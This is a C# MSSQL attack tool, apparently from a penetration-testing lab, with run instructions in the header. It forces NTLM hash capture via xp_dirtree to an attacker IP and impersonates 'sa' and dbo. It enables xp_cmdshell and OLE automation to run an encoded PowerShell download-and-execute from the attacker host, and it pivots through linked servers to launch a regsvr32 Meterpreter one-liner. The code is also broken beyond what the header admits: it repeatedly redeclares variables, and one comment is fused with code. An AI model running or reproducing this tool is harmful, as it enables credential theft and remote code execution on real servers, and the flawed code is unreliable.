// ================================================================
// mssql-runner.cs — MSSQL Enumeration and NTLM Hash Trigger
// ================================================================
// WHAT THIS DOES:
//   Connects to a SQL Server using Windows Integrated Authentication
//   (uses the current user's Windows credentials — no SQL password needed),
//   then performs enumeration and an NTLM coercion attack:
//
//     1. Authenticates to the SQL Server
//     2. Checks current SQL login and database username
//     3. Checks if the current user is in 'public' and 'sysadmin' roles
//     4. Forces NTLM authentication to a UNC path (your Kali Responder)
//        via xp_dirtree — captures the SQL service account's NTLMv2 hash
//     5. Enumerates logins that can be impersonated (EXECUTE AS LOGIN)
//     6. Shows current login context (useful after impersonation)
//
// NOTE: This file has a compile error in the original (duplicate 'res' variable
//       on lines 74/77). When compiling, rename the second 'res' variable to
//       'res2' to fix it. Only the code comments are being added here.
//
// ----------------------------------------------------------------
// BEFORE YOU RUN — CHANGE THESE VALUES
// ----------------------------------------------------------------
//   String serv       = "dc01.corp1.com"      -> SQL Server FQDN or IP
//   String db         = "master"              -> usually leave as "master"
//   String targetShare = "\\\\192.168.49.67\\share" -> YOUR Kali IP for hash capture
//
// ----------------------------------------------------------------
// COMPILE
// ----------------------------------------------------------------
//
//   OPTION A — Command line (Windows):
//     C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ^
//       /out:mssql-runner.exe mssql-runner.cs
//
//   OPTION B — Visual Studio:
//     1. File -> New -> Project -> Console App (.NET Framework) -> Next
//     2. Name it "mssql-runner", Framework: .NET Framework 4.x, click Create
//     3. Delete all code in Program.cs, paste THIS ENTIRE FILE
//     4. Fix the duplicate 'res' variable (rename second occurrence to 'res2')
//     5. Build -> Build Solution (Ctrl+Shift+B)
//     6. Find: bin\Debug\mssql-runner.exe
//
// ----------------------------------------------------------------
// RUN — COMPLETE ATTACK WORKFLOW
// ----------------------------------------------------------------
//
//   STEP 1 — Start Responder on Kali to capture NTLM hashes:
//     sudo responder -I eth0 -v
//
//   STEP 2 — Run mssql-runner.exe on the victim Windows machine
//            (as a domain user with access to the SQL Server):
//     .\mssql-runner.exe
//
//   STEP 3 — Responder captures the NTLMv2 hash from SQL Server:
//     [SMB] NTLMv2-SSP Hash: DC01$::CORP1:...
//
//   STEP 4 — Crack the hash:
//     hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt
//
//   STEP 5 — Use impersonation results:
//     If output shows "public=1" and a login you can impersonate (e.g. 'sa'),
//     proceed with EXECUTE AS LOGIN = 'sa' to escalate to sysadmin.
//     See ComprehensiveImpersonation.cs or sql-v2.cs for full impersonation.
//
// BEFORE RUNNING, CHANGE:
//   - serv         -> your target SQL Server hostname/IP
//   - targetShare  -> your Kali IP for hash capture (\\IP\\sharename)
// ================================================================
using System;
using System.Data.SqlClient;

namespace MSSQL
{
	public class Program
	{
		public static String executeQuery(String query, SqlConnection con)
		{
			SqlCommand cmd = new SqlCommand(query, con);
			SqlDataReader reader = cmd.ExecuteReader();
			try
			{
				String result = "";
				while (reader.Read() == true)
				{
					result += reader[0] + "\n";
				}
				reader.Close();
				return result;
			}
			catch
			{
				return "";
			}
		}

		public static void getGroupMembership(String groupToCheck, SqlConnection con)
		{
			String res = executeQuery($"SELECT IS_SRVROLEMEMBER('{groupToCheck}');", con);
			int role = int.Parse(res);
			if (role == 1)
			{
				Console.WriteLine($"[+] User is a member of the '{groupToCheck}' group.");
			}
			else
			{
				Console.WriteLine($"[-] User is not a member of the '{groupToCheck}' group.");
			}
		}

		public static void Main(string[] args)
		{
			String serv = "dc01.corp1.com";
			String db = "master";
			String conStr = $"Server = {serv}; Database = {db}; Integrated Security = True;";
			SqlConnection con = new SqlConnection(conStr);

			try
			{
				con.Open();
				Console.WriteLine("[+] Authenticated to MSSQL Server!");
			}
			catch
			{
				Console.WriteLine("[-] Authentication failed.");
				Environment.Exit(0);
			}

			// Enumerate login info
			String login = executeQuery("SELECT SYSTEM_USER;", con);
			Console.WriteLine($"[*] Logged in as: {login}");
			String uname = executeQuery("SELECT USER_NAME();", con);
			Console.WriteLine($"[*] Database username: {uname}");
			getGroupMembership("public", con);
			getGroupMembership("sysadmin", con);

			// Force NTLM authentication for hash-grabbing or relaying
			String targetShare = "\\\\192.168.49.67\\share";
			String res = executeQuery($"EXEC master..xp_dirtree \"{targetShare}\";", con);
			Console.WriteLine($"[*] Forced authentication to '{targetShare}'.");

			// Get logins that we can impersonate
			String res = executeQuery("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; ", con);
			Console.WriteLine($"[*] User can impersonate the following logins: {res}.");

			// Impersonate login and get login information
			String su = executeQuery("SELECT SYSTEM_USER;", con);
			String un = executeQuery("SELECT USER_NAME();", con);
			Console.WriteLine($"[*] Current database login is '{su}' with system user '{un}'.");
			String res = executeQuery("EXECUTE AS LOGIN = 'sa';", con);
			Console.WriteLine($"[*] Triggered impersonation.");
			su = executeQuery("SELECT SYSTEM_USER;", con);
			un = executeQuery("SELECT USER_NAME();", con);
			Console.WriteLine($"[*] Current database login is '{su}' with system user '{un}'.");

			// Impersonate dbo in trusted database and execute through 'xp_cmdshell'
			String res = executeQuery("use msdb; EXECUTE AS USER = 'dbo';", con);
			Console.WriteLine("[*] Triggered impersonation.");
			res = executeQuery("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", con);
			Console.WriteLine("[*] Enabled 'xp_cmdshell'.");
			String cmd = "powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADkALgA2ADcALwBjAGgAYQBwAHQAZQByADcALwByAHUAbgAuAHQAeAB0ACcAKQAgAHwAIABJAEUAWAA=";
			res = executeQuery($"EXEC xp_cmdshell '{cmd}'", con);
			Console.WriteLine($"[*] Executed command! Result: {res}");

			// Impersonate dbo in trusted database and execute through 'sp_OACreate' 
			String res = executeQuery("use msdb; EXECUTE AS USER = 'dbo';", con);
			Console.WriteLine("[*] Triggered impersonation.");
			res = executeQuery("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;", con);
			Console.WriteLine("[*] Enabled OLE automation procedures.");
			String cmd = "powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADkALgA2ADcALwBjAGgAYQBwAHQAZQByADcALwByAHUAbgAuAHQAeAB0ACcAKQAgAHwAIABJAEUAWAA=";
			res = executeQuery($"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '{cmd}';", con);
			Console.WriteLine($"[*] Executed command!");

			//
			// Execution via loading custom assemblies is also possible, but for brevity not included here
			//

			// Enumerate linked servers
			String res = executeQuery("EXEC sp_linkedservers;", con);
			Console.WriteLine($"[*] Found linked servers: {res}");

			// Execute on linked server
			String res = executeQuery("EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT DC01;", con);
			Console.WriteLine($"[*] Enabled advanced options on DC01.");
			res = executeQuery("EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT DC01;", con);
			Console.WriteLine($"[*] Enabled xp_cmdshell option on DC01.");
			res = executeQuery("EXEC ('xp_cmdshell ''whoami'';') AT DC01;", con);
			Console.WriteLine($"[*] Triggered command. Result: {res}");

			// Execute on linked server via 'openquery'
			String res = executeQuery("select 1 from openquery(\"dc01\", 'select 1; EXEC sp_configure ''show advanced options'', 1; reconfigure')", con);
			Console.WriteLine($"[*] Enabled advanced options on DC01.");
			res = executeQuery("select 1 from openquery(\"dc01\", 'select 1; EXEC sp_configure ''xp_cmdshell'', 1; reconfigure')", con);
			Console.WriteLine($"[*] Enabled xp_cmdshell options on DC01.");
			res = executeQuery("select 1 from openquery(\"dc01\", 'select 1; exec xp_cmdshell ''regsvr32 /s /n /u /i:http://192.168.49.67:8080/F0t6R5A.sct scrobj.dll''')", con);
			Console.WriteLine($"[*] Triggered Meterpreter oneliner on DC01. Check your listener!");

			// Escalate via double database linkedString su = executeQuery("SELECT SYSTEM_USER;", con);
			Console.WriteLine($"[*] Current system user is '{su}' in database 'appsrv01'.");
			su = executeQuery("select mylogin from openquery(\"dc01\", 'select SYSTEM_USER as mylogin');", con);
			Console.WriteLine($"[*] Current system user is '{su}' in database 'dc01' via 1 link.");
			su = executeQuery("select mylogin from openquery(\"dc01\", 'select mylogin from openquery(\"appsrv01\", ''select SYSTEM_USER as mylogin'')');", con);
			Console.WriteLine($"[*] Current system user is '{su}' in database 'appsrv01' via 2 links.");
		}
	}
}